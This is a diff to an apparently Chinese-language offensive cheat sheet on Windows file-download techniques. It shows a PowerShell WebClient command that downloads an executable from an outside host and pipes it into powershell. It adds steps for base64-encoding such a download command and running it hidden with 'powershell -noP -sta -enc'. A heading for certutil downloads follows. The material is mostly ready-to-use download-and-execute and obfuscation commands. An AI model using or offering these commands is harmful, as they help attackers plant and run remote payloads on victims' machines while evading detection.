@@ -952,6 +952,28 @@ bypass
 echo (new-object System.Net.WebClient).DownloadFile('http://192.168.31.93:8000/tomcat.exe','C:/Users/test/cc.exe')| powershell -
 ```
 
+base64编码(和其他base64不同，解不开)
+```
+$Text = "(new-object System.Net.WebClient).DownloadFile('http://xxxxxxxxxx:8000/bddch.txt','bdchd.txt')"
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+$EncodedText =[Convert]::ToBase64String($Bytes)
+$EncodedText
+```
+解码
+```
+$EncodedText = "dwByAGkAxxxxxxxxxxxxxxxxxxxAG0AbgB0AG4AJwA="
+$DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
+$DecodedText
+
+```
+运行base64编码的命令
+```
+powershell -noP -sta -enc xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+```
+
+
+
+
 ## certutil.exe下载
 
 ```
